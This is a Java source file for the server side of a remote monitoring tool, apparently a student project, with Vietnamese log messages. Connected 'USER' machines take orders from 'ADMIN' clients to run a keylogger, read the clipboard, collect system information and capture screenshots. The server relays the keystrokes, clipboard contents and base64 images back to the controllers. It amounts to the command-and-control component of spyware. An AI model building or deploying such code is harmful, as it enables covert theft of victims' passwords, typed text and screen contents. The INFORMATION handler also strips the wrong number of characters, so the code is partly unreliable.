package Controller;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import javax.imageio.ImageIO;
import java.io.File;

public class Server {
    private static List<ClientHandler> userClients = new ArrayList<>();
    private static List<AdminHandler> adminClients = new ArrayList<>();
    private static StringBuilder systemInfo = new StringBuilder();
    private static int clientCounter = 0; // Counter for assigning unique names
    private static Set<String> userConnectedIPs = new HashSet<>(); // Set to store user connected IPs
    private static Set<String> adminConnectedIPs = new HashSet<>(); // Set to store admin connected IPs

    public static void main(String[] args) {
        int portNumber = 5254;

        try (ServerSocket serverSocket = new ServerSocket(portNumber)) {
            System.out.println("Server đang chạy cổng " + portNumber);

            while (true) {
                Socket clientSocket = serverSocket.accept();
                new Thread(new ConnectionHandler(clientSocket)).start();
            }
        } catch (IOException e) {
            System.err.println("Lỗi!!!: " + e.getMessage());
        }
    }

    private static class ConnectionHandler implements Runnable {
        private final Socket clientSocket;

        public ConnectionHandler(Socket socket) {
            this.clientSocket = socket;
        }

        @Override
        public void run() {
            try {
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                String clientType = in.readLine();
                String clientIP = clientSocket.getInetAddress().getHostAddress();
                System.out.println("Địa chỉ IP của client: " + clientIP);

                if ("USER".equals(clientType)) {
                    synchronized (userConnectedIPs) {
                        if (userConnectedIPs.contains(clientIP)) {
                            System.out.println("User IP " + clientIP + " Kết nối đã tồn tại. Kết nối HỦY BỎ.");
                            clientSocket.close();
                            return;
                        } else {
                            userConnectedIPs.add(clientIP);
                        }
                    }
                    clientCounter++;
                    String clientName = "PC" + clientCounter;
                    ClientHandler userHandler = new ClientHandler(clientSocket, clientName);
                    userClients.add(userHandler);
                    System.out.println(clientName + " kết nối : " + clientSocket.getRemoteSocketAddress());
                    new Thread(userHandler).start();
                    notifyAdminClients("CONNECTED:" + clientName);

                } else if ("ADMIN".equals(clientType)) {
                    synchronized (adminConnectedIPs) {
                        if (adminConnectedIPs.contains(clientIP)) {
                            System.out.println("Admin IP " + clientIP + " đã kết nối đã tồn tại. Kết nối HỦY BỎ.");
                            clientSocket.close();
                            return;
                        } else {
                            adminConnectedIPs.add(clientIP);
                        }
                    }
                    AdminHandler adminHandler = new AdminHandler(clientSocket);
                    adminClients.add(adminHandler);
                    System.out.println("Admin client connected: " + clientSocket.getRemoteSocketAddress());
                    new Thread(adminHandler).start();
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            }
        }

        private void notifyAdminClients(String message) {
            for (AdminHandler admin : adminClients) {
                admin.sendSystemInfo(message);
            }
        }
    }

    private static class ClientHandler implements Runnable {
        private final Socket clientSocket;
        private final String clientName;
        private PrintWriter out;

        public ClientHandler(Socket socket, String clientName) {
            this.clientSocket = socket;
            this.clientName = clientName;
        }

        @Override
        public void run() {
            String clientIP = clientSocket.getInetAddress().getHostAddress();
            try {
                out = new PrintWriter(clientSocket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));

                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    if (inputLine.startsWith("INFORMATION:")) {
                        String info = clientName + ": " + inputLine.substring(5);
                        sendSystemInfoToAdmins(info);
                    } else if (inputLine.startsWith("CLIPBOARD:")) {
                        String info = clientName + ": " + inputLine.substring(10);
                        sendSystemInfoToAdmins(info);
                    } else if (inputLine.startsWith("KEY:")) {
                        String info = clientName + ": " + inputLine.substring(4);
                        sendSystemInfoToAdmins(info);
                    } else if (inputLine.startsWith("SCREENSHOT:")) {
                        String base64Image = inputLine.substring(11);
                        sendScreenshotToAdmins(base64Image);
                    }
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            } finally {
                try {
                    clientSocket.close();
                    synchronized (userConnectedIPs) {
                        userConnectedIPs.remove(clientIP);
                    }
                    userClients.remove(this);
                } catch (IOException e) {
                    System.err.println("Error: " + e.getMessage());
                }
            }
        }

        public void sendCommand(String command) {
            if (out != null) {
                out.println(command);
            }
        }

        public void sendSystemInfoToAdmins(String info) {
            synchronized (systemInfo) {
                for (AdminHandler admin : adminClients) {
                    admin.sendSystemInfo(info);
                }
            }
        }

        public void sendScreenshotToAdmins(String base64Image) {
            synchronized (systemInfo) {
                for (AdminHandler admin : adminClients) {
                    admin.sendScreenshot(base64Image);
                }
            }
        }
    }

    private static class AdminHandler implements Runnable {
        private final Socket adminSocket;
        private PrintWriter out;

        public AdminHandler(Socket socket) {
            this.adminSocket = socket;
        }

        @Override
        public void run() {
            String clientIP = adminSocket.getInetAddress().getHostAddress();
            try {
                out = new PrintWriter(adminSocket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(adminSocket.getInputStream()));

                String clientMessage;
                while ((clientMessage = in.readLine()) != null) {
                    if ("INFORMATION".equalsIgnoreCase(clientMessage)) {
                        systemInfo.setLength(0);
                        for (ClientHandler user : userClients) {
                            user.sendCommand("INFORMATION");
                        }
                        try {
                            Thread.sleep(3000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        sendSystemInfoToAdmin();
                    } else if ("clipboard".equalsIgnoreCase(clientMessage)) {
                        systemInfo.setLength(0);
                        for (ClientHandler user : userClients) {
                            user.sendCommand("clipboard");
                        }
                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        sendSystemInfoToAdmin();
                    } else if ("keylogger".equalsIgnoreCase(clientMessage)) {
                        systemInfo.setLength(0);
                        for (ClientHandler user : userClients) {
                            user.sendCommand("keylogger");
                        }
                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        sendSystemInfoToAdmin();
                    } else if (clientMessage.startsWith("USER")) {
                        // Handle user connection
                        System.out.println("User connected.");
                    } else if (clientMessage.startsWith("SCREENSHOT:")) {
                        String base64Image = clientMessage.substring("SCREENSHOT:".length());
                        BufferedImage image = decodeFromBase64(base64Image);
                        if (image != null) {
                            // Process the received screenshot
                            System.out.println("Received screenshot.");
                            // Optionally save the image to a file
                            ImageIO.write(image, "png", new File("screenshot.png"));
                        } else {
                            System.out.println("Failed to decode the image.");
                        }
                    }
                }
            } catch (IOException e) {
                System.err.println("Error: " + e.getMessage());
            } finally {
                try {
                    adminSocket.close();
                    synchronized (adminConnectedIPs) {
                        adminConnectedIPs.remove(clientIP);
                    }
                    adminClients.remove(this);
                } catch (IOException e) {
                    System.err.println("Error: " + e.getMessage());
                }
            }
        }

        private void sendSystemInfoToAdmin() {
            if (out != null) {
                synchronized (systemInfo) {
                    out.println(systemInfo.toString());
                }
            }
        }

        public void sendSystemInfo(String info) {
            if (out != null) {
                out.println(info);
            }
        }

        public void sendScreenshot(String base64Image) {
            if (out != null) {
                out.println("SCREENSHOT:" + base64Image);
            }
        }

        private BufferedImage decodeFromBase64(String base64Image) {
            try {
                byte[] imageBytes = Base64.getDecoder().decode(base64Image);
                ByteArrayInputStream bis = new ByteArrayInputStream(imageBytes);
                return ImageIO.read(bis);
            } catch (IOException e) {
                e.printStackTrace();
                return null;
            }
        }
    }
}
